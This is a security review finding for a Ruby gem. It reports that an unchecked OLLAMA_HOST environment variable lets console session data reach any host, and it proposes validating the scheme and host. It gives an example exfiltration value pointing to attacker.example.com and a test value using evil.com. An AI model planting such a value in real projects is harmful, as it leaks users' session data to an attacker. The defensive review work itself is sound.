---
name: ssrf-ollama-host-env-var
description: OLLAMA_HOST env var used verbatim in Net::HTTP — any host env var value redirects session data to attacker endpoint
metadata:
  type: finding
  priority: p1
  tags: [security, code-review]
---

## Problem Statement

`OLLAMA_HOST` is accepted verbatim and passed directly to `URI()` and `Net::HTTP`. A malicious or accidentally set env var (e.g., via a compromised `.env` file) redirects all console session data — after redaction but including all command inputs/outputs — to an arbitrary endpoint.

Unlike Anthropic/OpenAI which have hardcoded `API_URL` constants, Ollama's endpoint is fully attacker-controlled.

## Findings

**providers/ollama.rb:9-11:**
```ruby
def initialize
  @host = ENV.fetch("OLLAMA_HOST", DEFAULT_HOST)  # ← unchecked
  @model = ENV.fetch("OLLAMA_MODEL", DEFAULT_MODEL)
end
```

**providers/ollama.rb:17:**
```ruby
uri = URI("#{@host}/api/generate")  # ← arbitrary host
http = Net::HTTP.new(uri.host, uri.port)
```

Attack vector: `OLLAMA_HOST=http://attacker.example.com/capture` in any `.env` file in the project.

## Proposed Solutions

### Option A: Validate scheme and host at initialization
- **Pros:** Fails fast at session start, not on exit; clear error message
- **Cons:** None
- **Effort:** Small
- **Risk:** None

```ruby
def initialize
  raw_host = ENV.fetch("OLLAMA_HOST", DEFAULT_HOST)
  uri = URI.parse(raw_host)
  unless %w[http https].include?(uri.scheme) && uri.host
    raise ArgumentError, "OLLAMA_HOST must be an http/https URL (got: #{raw_host.inspect})"
  end
  @host = raw_host
  @model = ENV.fetch("OLLAMA_MODEL", DEFAULT_MODEL)
end
```

### Option B: Allowlist only localhost/loopback
- **Pros:** Tightest restriction — Ollama is meant to be local
- **Cons:** Breaks legitimate LAN or container deployments
- **Effort:** Small
- **Risk:** Low (but could frustrate Docker users)

### Option C: Document the risk, no code change
- **Pros:** Zero code change
- **Cons:** Real SSRF vector remains; unacceptable for a gem that handles console data
- **Effort:** Minimal
- **Risk:** High

## Recommended Action

Option A. Validate at `initialize` — any non-http/https or missing host raises immediately, not silently at exit.

## Technical Details

- **Affected file:** `lib/console_historian/providers/ollama.rb:9-11, 17`

## Acceptance Criteria

- [ ] `OLLAMA_HOST=ftp://evil.com` raises `ArgumentError` during session start
- [ ] `OLLAMA_HOST=http://localhost:11434` still works (default)
- [ ] `OLLAMA_HOST=https://my-ollama.internal` works for LAN deployments
- [ ] Spec added for `Ollama#initialize` with invalid hosts

## Work Log

- 2026-05-29: Found by security-sentinel agent in /ce-review pass
